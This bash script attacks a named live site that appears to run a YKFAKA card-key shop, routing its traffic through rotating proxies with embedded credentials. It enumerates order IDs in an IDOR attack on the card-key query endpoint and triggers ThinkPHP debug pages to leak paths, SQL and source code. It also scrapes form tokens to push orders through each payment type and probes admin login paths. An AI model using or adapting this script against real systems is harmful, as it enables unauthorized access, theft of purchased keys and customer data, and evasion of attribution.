#!/bin/bash
# tjqq YKFAKA: Query_Km IDOR, R_YkPay, ThinkPHP debug leak, order create
set -u
KEY=C413ED6D; PWD=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://tjqq.top
CK=/tmp/tjqq4.ck
OUT=/tmp/tjqq4_out
LOG=/tmp/tjqq4.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 5 --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }

for i in 1 2 3 4 5 6; do
  refresh
  code=$(curl -sk --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo "=== Query_Km IDOR samples ==="
for id in 000000000001 000000000002 1 2 100 1000 10000 99999 \
  20260801000000001 20260803100000001 null NULL undefined; do
  code=$(c -o "$OUT/qm_$id.html" -w "%{http_code}:%{size_download}" "$BASE/Query_Km/$id")
  # extract kami-ish
  python3 -c "
import re,sys
h=open(sys.argv[1],encoding='utf-8',errors='ignore').read()
text=re.sub(r'<[^>]+>',' ',h)
text=re.sub(r'\s+',' ',text)
print('QM', sys.argv[2], 'code_size', sys.argv[3], 'text', text[:220])
for pat in [r'卡密', r'卡号', r'密码', r'订单', r'不存在', r'未付款', r'已完成', r'fail', r'success']:
  if pat in h: print('  has', pat)
" "$OUT/qm_$id.html" "$id" "$code"
done

echo "=== R_YkPay / related ==="
for p in \
  /R_YkPay/000000000001 /R_YkPay/1 /R_YkPay/null \
  /Query_Km/null /Query_Km/1 \
  /Get_Yk_KC.html?ddid=000000000001 \
  /Get_Yk_KC.html?ddid=1 \
  /Get_Yk_KC.html?id=56 \
  /Get_Yk_KC.html; do
  code=$(c -o "$OUT/pbody" -w "%{http_code}:%{size_download}" "$BASE$p")
  python3 -c "
import re,sys
h=open('/tmp/tjqq4_out/pbody',encoding='utf-8',errors='ignore').read()
# ThinkPHP leak?
leaks=re.findall(r'(?:in file|FILE|Call Stack|/www/|/home/|/data/|database|password|mysql|think\\\\)[^<]{0,120}', h, re.I)
print(sys.argv[1], sys.argv[2], 'leaks', len(leaks))
for x in leaks[:8]: print(' ', x[:140])
text=re.sub(r'\s+',' ', re.sub(r'<[^>]+>',' ',h))
print(' text', text[:180])
" "$p" "$code"
done

echo "=== Get_Yk_KC correct param from home JS ==="
# scrape home for Get_Yk_KC usage
python3 - <<'PY'
import re
h=open('/tmp/tjqq4_out/home.html',encoding='utf-8',errors='ignore').read()
for m in re.finditer(r'.{0,60}Get_Yk_KC.{0,200}', h):
  print('CTX', m.group(0).replace('\n',' ')[:260])
PY
# try common: ddid / gid arrays
r=$(c -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/x-www-form-urlencoded' \
  -X POST -d 'ddid[]=56&ddid[]=65&ddid[]=43' "$BASE/Get_Yk_KC.html")
echo "KC_ARR => ${r:0:300}"
r=$(c -H 'X-Requested-With: XMLHttpRequest' -X POST -d 'ddid=56' "$BASE/Get_Yk_KC.html")
echo "KC_ddid56 => ${r:0:300}"
# save full error for ddid=1
c "$BASE/Get_Yk_KC.html?ddid=1" -o "$OUT/kc_err.html" -w "kc_err=%{http_code}:%{size_download}\n"
python3 - <<'PY'
import re
h=open('/tmp/tjqq4_out/kc_err.html',encoding='utf-8',errors='ignore').read()
print('err_len', len(h))
# ThinkPHP debug blocks
for pat in [r'<h1>([^<]+)', r'<h2>([^<]+)', r'Exception', r'/vendor/', r'/application/', r'Database', r'SQLSTATE', r'in\s+([/\w.-]+\.php)\s+line\s+(\d+)']:
  ms=re.findall(pat,h)
  if ms: print(pat, ms[:10])
# source code lines in prettyprint
codes=re.findall(r'<li[^>]*>(.*?)</li>', h)
print('li_count', len(codes))
print('sample_li', codes[:5])
open('/tmp/tjqq4_out/kc_err_text.txt','w').write(re.sub(r'\s+',' ', re.sub(r'<[^>]+>',' ',h))[:3000])
print(open('/tmp/tjqq4_out/kc_err_text.txt').read()[:800])
PY

echo "=== create order via Trade/Pay ==="
c "$BASE/Trade/56.html" -o "$OUT/trade.html"
python3 - <<'PY'
import re
h=open('/tmp/tjqq4_out/trade.html',encoding='utf-8',errors='ignore').read()
tok=re.search(r'name="__token__"\s+value="([^"]+)"',h)
gid=re.search(r'name="gid"[^>]*value="(\d+)"',h) or re.search(r'value="(\d+)"[^>]*name="gid"',h)
print('token', tok.group(1) if tok else None)
print('gid', gid.group(1) if gid else None)
# paytype options
print('radios', re.findall(r'name="paytype"[^>]*value="([^"]+)"|value="([^"]+)"[^>]*name="paytype"', h))
print('options', re.findall(r'<option[^>]*value="([^"]+)"[^>]*>', h)[:20])
if tok: open('/tmp/tjqq4_out/tok.txt','w').write(tok.group(1))
if gid: open('/tmp/tjqq4_out/gid.txt','w').write(gid.group(1))
# look for usdt/alipay labels
for m in re.finditer(r'paytype.{0,40}|USDT|支付宝|微信|QQ|余额', h):
  pass
print('pay_labels', re.findall(r'(USDT|支付宝|微信|QQ钱包|余额支付|银行卡)[^<]{0,20}', h)[:20])
PY
TOK=$(cat "$OUT/tok.txt"); GID=$(cat "$OUT/gid.txt")
PASS=tj$(date +%H%M%S)
# refresh token right before pay
c "$BASE/Trade/56.html" -o "$OUT/trade.html"
TOK=$(python3 -c "import re;h=open('/tmp/tjqq4_out/trade.html',encoding='utf-8',errors='ignore').read();m=re.search(r'name=\"__token__\"\s+value=\"([^\"]+)\"',h);print(m.group(1) if m else '')")
for paytype in 1 2 3 4 5; do
  r=$(c -D "$OUT/pay_hdr_$paytype.txt" -o "$OUT/pay_$paytype.html" -w "%{http_code}:%{size_download}:%{redirect_url}" \
    -H 'Content-Type: application/x-www-form-urlencoded' -e "$BASE/Trade/56.html" -X POST \
    --data-urlencode "paytype=$paytype" --data-urlencode "gid=$GID" --data-urlencode "count=1" \
    --data-urlencode "pass=$PASS" --data-urlencode "__token__=$TOK" "$BASE/Pay")
  echo "PAY$paytype => $r"
  grep -iE 'Location|location' "$OUT/pay_hdr_$paytype.txt" | head -3
  python3 -c "
import re,sys
h=open(sys.argv[1],encoding='utf-8',errors='ignore').read()
text=re.sub(r'\s+',' ', re.sub(r'<[^>]+>',' ',h))
print(' body', text[:250])
print(' orderish', re.findall(r'\d{12,20}|订单号|trade|orderno|Query_Km/[^\s\"\']+', h)[:10])
" "$OUT/pay_$paytype.html"
  # refresh token each time
  c "$BASE/Trade/56.html" -o "$OUT/trade.html" >/dev/null
  TOK=$(python3 -c "import re;h=open('/tmp/tjqq4_out/trade.html',encoding='utf-8',errors='ignore').read();m=re.search(r'name=\"__token__\"\s+value=\"([^\"]+)\"',h);print(m.group(1) if m else '')")
done

echo "=== Query with proper fields after getting order ==="
c "$BASE/Query.html" -o "$OUT/query.html"
python3 - <<'PY'
import re
h=open('/tmp/tjqq4_out/query.html',encoding='utf-8',errors='ignore').read()
print(open('/tmp/tjqq4_out/query.html').read() if False else '')
# dump form area
m=re.search(r'<form[\s\S]{0,2500}</form>', h)
print(m.group(0) if m else 'no form')
# scripts related to query
for m in re.finditer(r'function[^{]+\{[^}]{0,400}\}', h):
  if 'token' in m.group(0) or 'value' in m.group(0) or 'pass' in m.group(0):
    print('FN', m.group(0)[:300])
PY

echo "=== Manage/Admin paths ==="
for p in /Manage /Manage/Login /Manage/Login.html /Admin_Login.html /admin.php /ykfaka; do
  code=$(c -o /tmp/tj_pb -w "%{http_code}:%{size_download}" "$BASE$p")
  echo "M $p => $code $(head -c 80 /tmp/tj_pb | tr '\n' ' ')"
done

echo "===== PROBE4 DONE ====="
